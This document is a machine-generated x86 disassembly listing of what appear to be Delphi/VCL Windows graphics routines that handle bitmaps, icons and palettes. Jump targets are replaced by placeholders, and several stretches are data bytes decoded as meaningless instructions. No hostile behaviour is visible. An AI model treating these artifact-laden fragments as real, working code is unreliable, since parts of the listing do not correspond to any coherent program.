mov eax [ ebp - 0xc ]
call sub_41db88
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4f3
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e528
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e5b8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b44
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41e8af
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41e6a1
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41da7c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6a8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e6a8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e51c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407b44
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41e88f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e360
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407b44
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41e86c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e873
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41dad0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e51c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e528
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41e8d8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41da58
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cac
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41dd08
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41e9bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41e8d8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41ea28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41e8d8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41eac5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eacc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41eafc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402cac
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402cac
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41eaf0
xor edx edx
push ebp
push sub_41ecea
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41e9bc
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41e9bc
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41ecc3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407b44
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407b44
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407b44
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b44
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41ea28
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41ea28
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ecca
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41ecca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ecf1
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41ecf8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ed48
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41eda0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41ed48
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ede9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031d8
mov edi eax
mov eax esi
call sub_4031d8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ef23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ef06
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407c70
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef0d
mov al 0x1
sub_41ef3c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ef84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef8b
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_41ef90
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41efc4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f00f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f016
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_41f040
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
test [ ecx + eax * 2 ] bh
add [ ecx + edi + 0x41 ] cl
add al cl
cmp [ ecx ] eax
adc [ esi + eax * 2 + 0x69 ] dl
insb
inc esi
outsd
jb r-xdata
popad
je r-xdata
das
inc edi
add al ch
int 0x69
popad
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
mov ah 0xf0
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1bc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f1b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403260
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_4035b4
sub_41f08a
inc ecx
add [ eax ] dl
add [ eax ] al
add [ edi + edx ] cl
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xf2
inc ecx
add [ edx + edi + 0x3c840041 ] bl
inc ecx
add [ ecx + edi + 0x41 ] cl
add al cl
cmp [ ecx ] eax
adc [ esi + eax * 2 + 0x69 ] dl
insb
inc esi
outsd
jb r-xdata
das
inc edi
add al ch
int 0x69
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1bc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f1b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403260
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_4035b4
sub_41f0d8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f1b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403260
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f258
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1bc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
add esp 0xfffffff0
call sub_4035b4
sub_41f258
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f2db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d88
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407d3c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_404034
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404034
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_413918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2e2
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_41f2ec
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f36a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_413a74
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4031e0
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404244
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4043ec
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f371
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41f380
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x41f3 0x0
or al 0x0
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
pop esp
hlt
sub_41f3dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41f488
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41f488
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41f488
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41f45c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov eax [ esi + 0x8 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
